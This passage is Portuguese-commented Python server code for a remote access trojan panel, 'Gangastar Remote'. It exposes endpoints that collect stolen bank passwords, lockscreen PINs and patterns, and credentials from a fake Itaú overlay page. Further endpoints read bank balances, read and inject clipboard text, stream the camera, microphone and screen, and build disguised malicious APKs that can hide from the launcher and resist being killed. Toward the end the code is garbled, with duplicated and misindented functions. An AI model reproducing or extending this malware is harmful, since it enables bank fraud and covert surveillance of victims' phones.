                    "systemui" in package.lower() or
                    "keyguard" in package.lower() or
                    log.log_type.startswith("UNLOCK_") or
                    log.log_type in ["CAPTURED_PIN", "CAPTURED_PATTERN"]
                )
                
                if is_lockscreen:
                    digit = data.get("pin") or data.get("pattern") or data.get("text", "")
                    pins.append({
                        "id": log.id,
                        "type": log.log_type,
                        "digit": digit,
                        "eventType": event_type,
                        "created_at": log.created_at.isoformat(),
                        "isOffline": "OFFLINE" in log.log_type
                    })
        except:
            pass
    
    return pins[:limit]

@app.get("/api/devices/{device_id}/bank-passwords")
async def get_bank_passwords(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna senhas bancárias e credenciais capturadas sem omissão"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca do banco de dados todos os tipos de senha/captura
    passwords = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type.in_(["BANK_PASSWORD", "CAPTURED_APP_PASSWORD", "CAPTURED_PIN", "CAPTURED_PATTERN", "CUSTOM_CAPTURES"])
    ).order_by(DeviceLog.created_at.desc()).limit(200).all()
    
    result = []
    seen_keys = set()
    for log in passwords:
        try:
            raw_data = log.log_data
            password_data = json.loads(raw_data) if isinstance(raw_data, str) and raw_data.strip().startswith('{') else {}
            
            if log.log_type == "BANK_PASSWORD":
                bank_name = password_data.get('bank') or password_data.get('appName') or 'Banco'
                pkg = password_data.get('package') or password_data.get('packageName') or password_data.get('package_name') or 'com.seguranca.protecao'
                pwd = str(password_data.get('password') or '')
                if not pwd:
                    continue
                dedup_key = f"{pkg}:{pwd}:{password_data.get('hint','')}"
                if dedup_key in seen_keys:
                    continue
                seen_keys.add(dedup_key)
                
                result.append({
                    "id": log.id,
                    "bank": bank_name,
                    "package": pkg,
                    "password": pwd,
                    "digits": password_data.get('digits') or len(pwd),
                    "hint": password_data.get('hint') or password_data.get('label') or 'SENHA',
                    "label": password_data.get('label') or password_data.get('hint') or 'SENHA',
                    "status": password_data.get('status', 'captured'),
                    "source": password_data.get('source', 'keyboard'),
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CAPTURED_APP_PASSWORD":
                pkg = password_data.get('package', '')
                pwd = str(password_data.get('password', ''))
                if not pwd:
                    continue
                bank_name = BankPasswordDetector.BANK_APPS.get(pkg, pkg.split('.')[-1].title() if '.' in pkg else 'App')
                result.append({
                    "id": log.id,
                    "bank": bank_name,
                    "package": pkg,
                    "password": pwd,
                    "digits": len(pwd),
                    "hint": "SENHA DE APP",
                    "label": "Injeção / Overlay",
                    "status": "captured",
                    "source": "VISUAL_SCREEN",
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CAPTURED_PIN":
                pin = str(password_data.get('pin', ''))
                if not pin:
                    continue
                result.append({
                    "id": log.id,
                    "bank": "Lockscreen",
                    "package": "com.android.keyguard",
                    "password": pin,
                    "digits": len(pin),
                    "hint": "PIN DESBLOQUEIO",
                    "label": "PIN de Tela",
                    "status": "captured",
                    "source": "LOCKSCREEN",
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CAPTURED_PATTERN":
                pattern = str(password_data.get('pattern', ''))
                if not pattern:
                    continue
                result.append({
                    "id": log.id,
                    "bank": "Lockscreen",
                    "package": "com.android.keyguard",
                    "password": pattern,
                    "digits": len(pattern.split('-')) if '-' in pattern else len(pattern),
                    "hint": "PADRÃO DESBLOQUEIO",
                    "label": "Desenho de Tela",
                    "status": "captured",
                    "source": "LOCKSCREEN",
                    "timestamp": log.created_at.isoformat()
                })
            elif log.log_type == "CUSTOM_CAPTURES":
                cap_data = password_data.get('captured_data', {})
                proj_name = password_data.get('project_name', 'Overlay Custom')
                for k, v in cap_data.items():
                    if not k.startswith('_') and v:
                        v_str = str(v)
                        result.append({
                            "id": log.id,
                            "bank": proj_name,
                            "package": password_data.get('package', 'custom.overlay'),
                            "password": v_str,
                            "digits": len(v_str),
                            "hint": k,
                            "label": f"Campo: {k}",
                            "status": "captured",
                            "source": "VISUAL_SCREEN",
                            "timestamp": log.created_at.isoformat()
                        })
        except:
            pass
    
    return result

@app.post("/api/keylog/custom")
async def receive_custom_keylog(request: Request, db: Session = Depends(get_db)):
    """Recebe e registra senhas capturadas por páginas overlay HTML (como Itaú)"""
    try:
        data = await request.json()
        device_id = data.get("device_id") or "UNKNOWN"
        package = data.get("package") or "br.com.itau"
        app_name = data.get("appName") or "Itaú Oficial"
        text = data.get("text") or ""
        
        password_info = {
            'device_id': device_id,
            'bank': app_name,
            'package': package,
            'packageName': package,
            'password': text,
            'type': 'CAPTURED_PIN',
            'timestamp': utc_now().isoformat(),
            'field_name': 'Senha Overlay',
            'label': 'Senha Overlay',
            'hint': 'Senha Overlay',
            'source': 'HTML_OVERLAY',
            'isPassword': True
        }
        
        log_bank = DeviceLog(
            device_id=device_id,
            log_type="BANK_PASSWORD",
            log_data=json.dumps(password_info, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(log_bank)
        
        log_key = DeviceLog(
            device_id=device_id,
            log_type="KEYLOG",
            log_data=json.dumps({
                "package": package,
                "appName": app_name,
                "isPassword": True,
                "text": text,
                "timestamp": utc_now().isoformat()
            }, ensure_ascii=False),
            created_at=utc_now()
        )
        db.add(log_key)
        db.commit()
        
        try:
            await manager.broadcast_to_admins({
                "type": "BANK_PASSWORD_CAPTURED",
                "device_id": device_id,
                "data": password_info
            })
        except Exception:
            pass
            
        return {"status": "ok"}
    except Exception as e:
        logger.error(f"Erro ao registrar keylog customizado: {e}")
        return {"status": "error", "detail": str(e)}

@app.get("/api/devices/{device_id}/custom-captures")
async def get_device_custom_captures(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna dados capturados de telas customizadas do APK Studio"""
    check_device_access(device_id, current_user, db)
    
    captures = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "CUSTOM_CAPTURES"
    ).order_by(DeviceLog.created_at.desc()).limit(100).all()
    
    result = []
    for log in captures:
        try:
            payload = json.loads(log.log_data)
            result.append({
                "id": log.id,
                "project_id": payload.get("project_id"),
                "project_name": payload.get("project_name", "Custom Screen"),
                "captured_data": payload.get("captured_data", {}),
                "timestamp": log.created_at.isoformat()
            })
        except:
            pass
    return result

@app.delete("/api/devices/{device_id}/custom-captures/{log_id}")
async def delete_device_custom_capture(
    device_id: str,
    log_id: int,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Deleta uma captura customizada"""
    check_device_access(device_id, current_user, db)
    log = db.query(DeviceLog).filter(
        DeviceLog.id == log_id,
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "CUSTOM_CAPTURES"
    ).first()
    if not log:
        raise HTTPException(status_code=404, detail="Captura não encontrada")
    db.delete(log)
    db.commit()
    return {"ok": True}

@app.delete("/api/devices/{device_id}/logs/{log_id}")
async def delete_device_log(
    device_id: str,
    log_id: int,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Deleta um log específico do dispositivo"""
    check_device_access(device_id, current_user, db)
    log = db.query(DeviceLog).filter(DeviceLog.device_id == device_id, DeviceLog.id == log_id).first()
    if not log:
        raise HTTPException(status_code=404, detail="Log não encontrado")
    db.delete(log)
    db.commit()
    return {"status": "ok"}

@app.delete("/api/devices/{device_id}/logs/package/{package_name}")
async def delete_device_logs_by_package(
    device_id: str,
    package_name: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Deleta todos os logs de um pacote de app específico (banco)"""
    check_device_access(device_id, current_user, db)
    logs = db.query(DeviceLog).filter(DeviceLog.device_id == device_id).all()
    count = 0
    for log in logs:
        is_match = False
        if log.log_type in ["KEYLOG", "KEYLOG_OFFLINE", "BANK_PASSWORD", "BANK_BALANCE"]:
            try:
                data = json.loads(log.log_data)
                if isinstance(data, dict):
                    if data.get("package") == package_name:
                        is_match = True
            except:
                pass
        
        # fallback
        if not is_match and package_name in log.log_data:
            is_match = True
            
        if is_match:
            db.delete(log)
            count += 1
            
    db.commit()
    return {"status": "ok", "deleted_count": count}

@app.get("/api/devices/{device_id}/bank-balances")
async def get_bank_balances(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna os saldos bancários capturados do dispositivo"""
    check_device_access(device_id, current_user, db)
    
    # Busca os logs do tipo BANK_BALANCE
    balances = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "BANK_BALANCE"
    ).order_by(DeviceLog.created_at.desc()).limit(150).all()
    
    result = []
    for log in balances:
        try:
            data = json.loads(log.log_data)
            package = data.get("package")
            if package:
                result.append({
                    "id": log.id,
                    "bank": data.get("appName", data.get("bank", "Banco")),
                    "package": package,
                    "balance": data.get("balance"),
                    "credit_limit": data.get("credit_limit"),
                    "invoice": data.get("invoice"),
                    "timestamp": log.created_at.isoformat()
                })
        except Exception:
            pass
            
    return result

@app.get("/api/devices/{device_id}/clipboard")
async def get_device_clipboard(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna os logs de área de transferência (clipboard) do dispositivo."""
    check_device_access(device_id, current_user, db)
    logs = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "CLIPBOARD"
    ).order_by(DeviceLog.created_at.desc()).limit(100).all()
    
    current_clip = manager.device_info.get(device_id, {}).get("clipboard")
    
    res = []
    for l in logs:
        try:
            parsed = json.loads(l.log_data)
            res.append({
                "id": l.id,
                "text": parsed.get("text") or l.log_data,
                "timestamp": l.created_at.isoformat()
            })
        except Exception:
            res.append({
                "id": l.id,
                "text": l.log_data,
                "timestamp": l.created_at.isoformat()
            })
    return {"current": current_clip, "history": res}

@app.post("/api/devices/{device_id}/clipboard")
async def set_device_clipboard(
    device_id: str,
    request: Request,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Injeta texto na área de transferência (clipboard) do dispositivo."""
    check_device_access(device_id, current_user, db)
    body = await request.json()
    text = body.get("text", "")
    if not text:
        raise HTTPException(status_code=400, detail="Texto não fornecido")
    await manager.send_command(device_id, {"action": "SET_CLIPBOARD", "text": text})
    return {"status": "ok", "message": f"Texto enviado para área de transferência: {text}"}

@app.get("/api/devices/{device_id}/uploaded-files")
async def get_uploaded_files(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna arquivos enviados pelo dispositivo (documentos, fotos, PDFs)"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Busca arquivos do banco de dados
    files = db.query(DeviceLog).filter(
        DeviceLog.device_id == device_id,
        DeviceLog.log_type == "FILE_UPLOAD"
    ).order_by(DeviceLog.created_at.desc()).limit(50).all()
    
    result = []
    for log in files:
        try:
            file_data = json.loads(log.log_data)
            result.append({
                "id": log.id,
                "label": file_data.get('label'),
                "fileName": file_data.get('fileName'),
                "mimeType": file_data.get('mimeType'),
                "data": file_data.get('data'),  # Base64
                "timestamp": log.created_at.isoformat()
            })
        except:
            pass
    
    return result

@app.get("/api/devices/{device_id}/screen-hierarchy")
async def get_device_screen_hierarchy(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna hierarquia da tela atual (Screen Reader V2) com disparo automático de captura"""
    check_device_access(device_id, current_user, db)
    
    # Solicita atualização em tempo real do leitor de tela V2 ao aparelho
    asyncio.create_task(manager.send_command(device_id, {"action": "TOGGLE_SCREEN_READER", "enabled": True}))
    asyncio.create_task(manager.send_command(device_id, {"action": "REQUEST_HIERARCHY"}))
    
    hierarchy = manager.get_latest_hierarchy(device_id, max_age_seconds=5.0)
    
    if hierarchy:
        return {
            "status": "ok",
            "data": hierarchy
        }
    else:
        return {
            "status": "empty",
            "data": None
        }


@app.get("/api/devices/{device_id}/unlock-sequence")
async def get_device_unlock_sequence(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔓 Retorna sequência de desbloqueio gravada"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    sequence = manager.get_unlock_sequence(device_id)
    
    if sequence:
        return {
            "status": "ok",
            "type": sequence.get("type", "unknown"),
            "sequence": sequence.get("sequence", []),
            "count": sequence.get("count", 0)
        }
    else:
        return {
            "status": "empty",
            "type": "none",
            "sequence": [],
            "count": 0
        }


# ==================== API DE APPS INSTALADOS ====================

@app.get("/api/devices/{device_id}/installed-apps")
async def get_device_installed_apps(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """📱 Retorna lista de apps instalados no dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    apps = manager.get_installed_apps(device_id)
    
    if apps:
        return {
            "status": "ok",
            "apps": apps,
            "count": len(apps),
            "source": "memory"
        }
    else:
        # Tenta carregar do cache persistido no banco de dados
        try:
            cached = db.query(DeviceLog).filter(
                DeviceLog.device_id == device_id,
                DeviceLog.log_type == "INSTALLED_APPS_CACHE"
            ).order_by(DeviceLog.created_at.desc()).first()
            
            if cached:
                data = json.loads(cached.log_data)
                apps_list = data.get("apps", [])
                # Restaura na memória também
                manager.store_installed_apps(device_id, apps_list)
                return {
                    "status": "ok",
                    "apps": apps_list,
                    "count": len(apps_list),
                    "source": "db_cache"
                }
        except Exception as e:
            logger.error(f"Erro ao restaurar apps do cache: {e}")
        
        return {
            "status": "empty",
            "apps": [],
            "count": 0
        }


@app.post("/api/devices/{device_id}/refresh-apps")
async def refresh_device_apps(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """📱 Solicita atualização da lista de apps"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Envia comando para o dispositivo
    success = await manager.send_command(device_id, {"action": "GET_INSTALLED_APPS"})
    
    if success:
        return {"status": "ok", "message": "Solicitação enviada"}
    else:
        raise HTTPException(status_code=404, detail="Dispositivo não conectado")


@app.post("/api/devices/{device_id}/unlock-sequence")
async def save_device_unlock_sequence(
    device_id: str,
    data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """🔓 Salva sequência de desbloqueio gravada via VNC"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    sequence_type = data.get("type", "unknown")
    sequence = data.get("sequence", [])
    
    if sequence:
        manager.store_unlock_sequence(device_id, {
            "type": sequence_type,
            "sequence": sequence,
            "count": len(sequence)
        })
        logger.info(f"🔓 Sequência de desbloqueio salva para {device_id}: {len(sequence)} ações ({sequence_type})")
        return {
            "status": "ok",
            "message": f"Sequência salva: {len(sequence)} ações"
        }
    else:
        return {
            "status": "error",
            "message": "Nenhuma ação na sequência"
        }


@app.websocket("/ws/dashboard/{device_id}")
async def dashboard_stream(websocket: WebSocket, device_id: str):
    """WebSocket que entrega frames em tempo real para o painel"""
    operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
    if not operator:
        return
    
    queue = await manager.register_dashboard_client(device_id, websocket)
    
    try:
        _send_errors = 0
        while True:
            try:
                frame = await asyncio.wait_for(queue.get(), timeout=15.0)
                
                # Drena frames extras acumulados - entrega só o mais recente
                latest = frame
                while not queue.empty():
                    try:
                        latest = queue.get_nowait()
                    except asyncio.QueueEmpty:
                        break
                
                await websocket.send_bytes(latest)
                _send_errors = 0
            except asyncio.TimeoutError:
                try:
                    await websocket.send_bytes(b'')
                except Exception:
                    break
            except RuntimeError as e:
                if "disconnect" in str(e).lower() or "closed" in str(e).lower():
                    break
                _send_errors += 1
                if _send_errors > 5:
                    break
            except Exception:
                _send_errors += 1
                if _send_errors > 5:
                    break
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        if "disconnect" not in str(exc).lower() and "closed" not in str(exc).lower():
            logger.warning(f"Erro no dashboard WS ({device_id}): {type(exc).__name__}")
    finally:
        manager.unregister_dashboard_client(device_id, websocket)


@app.websocket("/ws/camera/{device_id}")
async def camera_stream(websocket: WebSocket, device_id: str):
    """📷 WebSocket que entrega frames de câmera em tempo real"""
    operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
    if not operator:
        return
    
    queue = await manager.register_camera_client(device_id, websocket)
    
    try:
        while True:
            try:
                frame = await asyncio.wait_for(queue.get(), timeout=30.0)
                await websocket.send_bytes(frame)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_bytes(b'')
                except Exception:
                    break
            except RuntimeError as e:
                if "disconnect" in str(e).lower() or "closed" in str(e).lower():
                    break
                raise
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        if "disconnect" not in str(exc).lower() and "closed" not in str(exc).lower():
            logger.warning(f"Erro no camera WS ({device_id}): {type(exc).__name__}")
    finally:
        manager.unregister_camera_client(device_id, websocket)


@app.websocket("/ws/microphone/{device_id}")
async def microphone_stream(websocket: WebSocket, device_id: str):
    """🎤 WebSocket que entrega chunks de áudio em tempo real"""
    operator = await authenticate_dashboard_websocket(websocket, device_id=device_id)
    if not operator:
        return
    
    queue = await manager.register_audio_client(device_id, websocket)
    
    try:
        while True:
            try:
                audio_chunk = await asyncio.wait_for(queue.get(), timeout=30.0)
                await websocket.send_bytes(audio_chunk)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_bytes(b'')
                except Exception:
                    break
            except RuntimeError as e:
                if "disconnect" in str(e).lower() or "closed" in str(e).lower():
                    break
                raise
    except WebSocketDisconnect:
        pass
    except Exception as exc:
        if "disconnect" not in str(exc).lower() and "closed" not in str(exc).lower():
            logger.warning(f"Erro no microphone WS ({device_id}): {type(exc).__name__}")
    finally:
        manager.unregister_audio_client(device_id, websocket)

# ==================== PAINEL WEB ====================

def serve_spa_html():
    """Retorna o index.html do frontend buildado com headers anti-cache"""
    frontend_path = Path(__file__).parent / "web-dist" / "index.html"
    if frontend_path.exists():
        response = FileResponse(frontend_path, media_type="text/html")
        response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
        response.headers["Pragma"] = "no-cache"
        response.headers["Expires"] = "0"
        return response
    else:
        return HTMLResponse("""
        <!DOCTYPE html>
        <html>
        <head>
            <title>RAT - Painel de Controle</title>
            <style>
                body { font-family: Arial; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                .container { text-align: center; }
                h1 { color: #e94560; }
                p { color: #aaa; }
                code { background: #333; padding: 10px; border-radius: 5px; display: block; margin: 20px 0; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>⚠️ Frontend não buildado</h1>
                <p>Execute o comando abaixo para buildar o frontend:</p>
                <code>cd server/web-app && npm run build</code>
            </div>
        </body>
        </html>
        """)

@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    """Serve o painel web na raiz"""
    return serve_spa_html()

@app.get("/login", response_class=HTMLResponse)
async def serve_login():
    """Serve a página de login"""
    return serve_spa_html()

@app.get("/gangastar-logo.svg")
async def serve_gangastar_logo_new():
    """Logo estatico do painel Gangastar Remote."""
    logo_path = Path(__file__).parent / "web-dist" / "gangastar-logo.svg"
    if not logo_path.exists():
        logo_path = Path(__file__).parent / "web-dist" / "gangstar-logo.svg"
    if logo_path.exists():
        return FileResponse(logo_path, media_type="image/svg+xml")
    raise HTTPException(status_code=404, detail="Logo nao encontrado")

@app.get("/gangstar-logo.svg")
async def serve_gangastar_logo():
    """Logo estatico do painel Gangastar Remote (web-dist) - retrocompatibilidade."""
    logo_path = Path(__file__).parent / "web-dist" / "gangastar-logo.svg"
    if not logo_path.exists():
        logo_path = Path(__file__).parent / "web-dist" / "gangstar-logo.svg"
    if logo_path.exists():
        return FileResponse(logo_path, media_type="image/svg+xml")
    raise HTTPException(status_code=404, detail="Logo nao encontrado")

@app.get("/admin", response_class=HTMLResponse)
async def serve_admin():
    """Serve a página de admin"""
    return serve_spa_html()

@app.get("/dashboard", response_class=HTMLResponse)
async def serve_dashboard():
    """Serve o dashboard"""
    return serve_spa_html()

@app.get("/device/{device_id}", response_class=HTMLResponse)
async def serve_device_control(device_id: str):
    """Serve a página de controle de dispositivo"""
    return serve_spa_html()

@app.get("/build-apk", response_class=HTMLResponse)
async def serve_build_apk():
    """Serve a página de build APK"""
    return serve_spa_html()

@app.get("/itau_senha.html", response_class=HTMLResponse)
async def serve_itau_senha():
    """Serve a página de captura da senha do Itaú"""
    file_path = Path(__file__).parent / "web-dist" / "itau_senha.html"
    if not file_path.exists():
        file_path = Path(__file__).parent / "web-app" / "public" / "itau_senha.html"
    if file_path.exists():
        return FileResponse(file_path, media_type="text/html")
    raise HTTPException(status_code=404, detail="itau_senha.html não encontrado")

@app.get("/live", response_class=HTMLResponse)
async def serve_live():
    """Serve a página de live streaming"""
    return serve_spa_html()

@app.get("/broadcast", response_class=HTMLResponse)
async def serve_broadcast():
    """Serve a página de transmissão"""
    return serve_spa_html()

@app.get("/map", response_class=HTMLResponse)
async def serve_map():
    """Serve a página de mapa"""
    return serve_spa_html()

@app.get("/storage", response_class=HTMLResponse)
async def serve_storage():
    """Serve a página de armazenamento"""
    return serve_spa_html()

@app.get("/datacenter", response_class=HTMLResponse)
async def serve_datacenter():
    """Serve a página de datacenter"""
    return serve_spa_html()

@app.get("/mass", response_class=HTMLResponse)
async def serve_mass():
    """Serve a página de dispositivos em massa"""
    return serve_spa_html()

@app.get("/groups", response_class=HTMLResponse)
async def serve_groups():
    """Serve a página de grupos"""
    return serve_spa_html()

@app.get("/reports", response_class=HTMLResponse)
async def serve_reports():
    """Serve a página de relatórios"""
    return serve_spa_html()

@app.get("/geofence", response_class=HTMLResponse)
async def serve_geofence():
    """Serve a página de geolocalização"""
    return serve_spa_html()

@app.get("/schedule", response_class=HTMLResponse)
async def serve_schedule():
    """Serve a página de agendamento"""
    return serve_spa_html()

@app.get("/win-builder", response_class=HTMLResponse)
async def serve_win_builder():
    """Serve a página de construtor Windows"""
    return serve_spa_html()

@app.get("/win-device/{device_id}", response_class=HTMLResponse)
async def serve_win_device(device_id: str):
    """Serve a página de dispositivo Windows"""
    return serve_spa_html()

@app.get("/apk-builder", response_class=HTMLResponse)
async def serve_apk_builder():
    """Serve a página de construtor APK"""
    return serve_spa_html()

@app.get("/build-apk/quick", response_class=HTMLResponse)
async def serve_build_apk_quick():
    """Serve a página de build APK rápido"""
    return serve_spa_html()

@app.get("/build-apk/visual", response_class=HTMLResponse)
async def serve_build_apk_visual():
    """Serve a página de build APK visual"""
    return serve_spa_html()

@app.get("/build-apk/workspace", response_class=HTMLResponse)
async def serve_build_apk_workspace():
    """Serve a página de workspace de build APK"""
    return serve_spa_html()

@app.get("/build-apk/wizard", response_class=HTMLResponse)
async def serve_build_apk_wizard():
    """Serve a página de wizard de build APK"""
    return serve_spa_html()

@app.get("/apk-studio", response_class=HTMLResponse)
async def serve_apk_studio():
    """Serve a página de APK Studio"""
    return serve_spa_html()

@app.get("/apk-bypass", response_class=HTMLResponse)
async def serve_apk_bypass():
    """Serve a página de bypass APK"""
    return serve_spa_html()

@app.get("/admin-panel", response_class=HTMLResponse)
async def serve_admin_panel():
    """Serve a página de painel de administração"""
    return serve_spa_html()

@app.get("/auth/2fa", response_class=HTMLResponse)
async def serve_auth_2fa():
    """Serve a página de autenticação 2FA"""
    return serve_spa_html()

# ==================== API DE CONSTRUÇÃO DE APK ====================

# Fila de builds em background
import concurrent.futures
build_executor = concurrent.futures.ThreadPoolExecutor(max_workers=2, thread_name_prefix="apk_builder")
def create_smooth_progress_ticker(target_dict: dict, build_id: str, start_pct: int = 30, max_pct: int = 88, interval_sec: float = 3.0):
    """
    Thread em background para fazer a barra de progresso do APK subir suavemente
    de 30% a 88% sem travar nos 30%!
    """
    messages_map = [
        (35, "Processando manifestos e empacotando assets..."),
        (45, "Compilando recursos Android e bytecode DEX..."),
        (55, "Executando tarefas de compilação Gradle..."),
        (65, "Processando bibliotecas e classes Java/Kotlin..."),
        (75, "Otimizando APK e alinhando estrutura zip..."),
        (82, "Assinando APK com chave de segurança..."),
        (88, "Finalizando empacotamento e verificando assinaturas...")
    ]
    stop_event = threading.Event()
    
def create_smooth_progress_ticker(target_dict, build_id, start_pct, max_pct, interval_sec=1.5, messages_map=None):
    if messages_map is None:
        messages_map = []
        stop_event = threading.Event()

def run_ticker():
    idx = 0
    current_pct = start_pct
    while not stop_event.is_set():
        time.sleep(interval_sec)
        if stop_event.is_set():
            break
        if build_id in target_dict and target_dict[build_id].get("status") == "building":
            current_pct += 2
            if idx < len(messages_map) and current_pct >= messages_map[idx][0]:
                target_dict[build_id]["message"] = messages_map[idx][1]
                idx = min(idx + 1, len(messages_map) - 1)

                target_dict[build_id]["progress"] = min(current_pct, max_pct)

                t = threading.Thread(target=run_ticker, daemon=True)
                t.start()
                return stop_event.set

            build_status = {}  # {build_id: {"status": "building/done/error", "progress": 0-100, "result": {...}}}

def build_apk_background(build_id: str, app_name: str, icon_data: bytes, owner_id: int, owner_username: str, webview_url: str = None, hide_from_launcher: bool = False, enable_anti_kill: bool = True, language: str = "pt", enable_camera: bool = True, enable_contacts: bool = True, enable_send_sms: bool = True, enable_read_sms: bool = True):
    """Executa build de APK em background"""
    try:
        build_status[build_id] = {"status": "building", "progress": 10, "message": "Iniciando..."}

        # Cria diretório temporário
        temp_dir = tempfile.mkdtemp()
        icon_path = os.path.join(temp_dir, "icon.png") if icon_data else None

        if icon_path and icon_data:
            with open(icon_path, "wb") as f:
                f.write(icon_data)
        
        build_status[build_id]["progress"] = 20
        build_status[build_id]["message"] = "Preparando projeto..."
        
        # Caminho do projeto Android
        server_dir = os.path.dirname(os.path.abspath(__file__))
        project_dir = os.path.join(server_dir, "..", "android-rat")
        
        # URL do servidor (VPS)
        ngrok_url = gangstar_env.public_ws_url(f"build_id={build_id}")
        
        build_status[build_id]["progress"] = 30
        build_status[build_id]["message"] = "Iniciando compilação Gradle..."
        
        # Inicia ticker suave para avançar a barra de 30% a 88%
        stop_ticker = create_smooth_progress_ticker(build_status, build_id, 30, 88, interval_sec=3.0)

        # Constrói APK
        safe_app_name = re.sub(r'[^a-zA-Z0-9_-]', '_', app_name.strip()) or "app"
        builder = APKBuilder(project_dir, ngrok_url)
        output_apk = os.path.join(temp_dir, f"{safe_app_name}.apk")
        
        logger.info(f"[BUILD] Iniciando build_custom_apk para {app_name}")
        logger.info(f"[BUILD] output_apk path: {output_apk}")
        logger.info(f"[BUILD] project_dir: {project_dir}")
        logger.info(f"[BUILD] project_dir existe: {os.path.exists(project_dir)}")
        
        success = builder.build_custom_apk(
            app_name=app_name,
            icon_path=icon_path,
            output_path=output_apk,
            webview_url=webview_url,
            hide_from_launcher=hide_from_launcher,
            enable_anti_kill=enable_anti_kill,
            language=language,
            enable_camera=enable_camera,
            enable_contacts=enable_contacts,
            enable_send_sms=enable_send_sms,
            enable_read_sms=enable_read_sms
        )
        
        logger.info(f"[BUILD] build_custom_apk retornou: {success}")
        logger.info(f"[BUILD] APK gerado em: {output_apk}")
        logger.info(f"[BUILD] APK existe: {os.path.exists(output_apk)}")
        if os.path.exists(output_apk):
            logger.info(f"[BUILD] APK tamanho: {os.path.getsize(output_apk)} bytes")
        
        stop_ticker()
        
        if not success:
            build_status[build_id] = {"status": "error", "progress": 0, "message": "Erro na compilação"}
            return
        
        build_status[build_id]["progress"] = 90
        build_status[build_id]["message"] = "Finalizando..."
        
        # Copia APK para pasta de downloads com ID único para evitar cache de ícone e arquivo
        downloads_dir = os.path.join(server_dir, "downloads")
        os.makedirs(downloads_dir, exist_ok=True)
        logger.info(f"[DOWNLOAD] Pasta downloads: {downloads_dir}")
        logger.info(f"[DOWNLOAD] APK temporário: {output_apk}")
        logger.info(f"[DOWNLOAD] APK existe: {os.path.exists(output_apk)}")
        
        apk_filename = f"{safe_app_name}_{build_id}.apk"
        final_apk = os.path.join(downloads_dir, apk_filename)
        logger.info(f"[DOWNLOAD] Copiando para: {final_apk}")
        
        try:
            shutil.copy(output_apk, final_apk)
            logger.info(f"[DOWNLOAD] APK copiado com sucesso: {final_apk}")
            logger.info(f"[DOWNLOAD] APK tamanho: {os.path.getsize(final_apk)} bytes")
        except Exception as copy_err:
            logger.error(f"[ERRO] Falha ao copiar APK: {copy_err}")
            raise
        
        shutil.rmtree(temp_dir)
        
        build_status[build_id] = {
            "status": "done",
            "progress": 100,
            "message": "Concluído!",
            "result": {
                "apk_name": apk_filename,
                "download_url": f"/api/download-apk/{apk_filename}",
                "build_id": build_id,
                "owner": owner_username
            }
        }
        logger.info(f"[OK] APK construido em background: {app_name} (build_id: {build_id})")
        
    except Exception as e:
        logger.error(f"[ERRO] Erro no build em background: {e}")
        build_status[build_id] = {"status": "error", "progress": 0, "message": str(e)}

@app.post("/api/build-apk")
async def build_custom_apk(
    app_name: str = Form(...),
    icon: Union[UploadFile, str, None] = File(None),
    webview_url: str = Form(None),
    hide_from_launcher: bool = Form(False),
    enable_anti_kill: bool = Form(True),
    language: str = Form("pt"),
    enable_camera: bool = Form(True),
    enable_contacts: bool = Form(True),
    enable_send_sms: bool = Form(True),
    enable_read_sms: bool = Form(True),
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Inicia build de APK em background (não bloqueia o servidor)
    """
import uuid
from models import APKBuild
    
    try:
        # Gera build_id único
        build_id = str(uuid.uuid4())[:8].upper()
        
        logger.info(f"[BUILD] Iniciando build de APK em background: {app_name} (usuario: {current_user.username}, idioma: {language}, anti_kill: {enable_anti_kill})")
        
        icon_data = None
        if icon:
            if hasattr(icon, "read"):
                raw_data = await icon.read()
                if raw_data and len(raw_data) > 0:
                    icon_data = raw_data
            elif isinstance(icon, bytes):
                icon_data = icon
            elif isinstance(icon, str) and icon.startswith("data:image"):
import base64
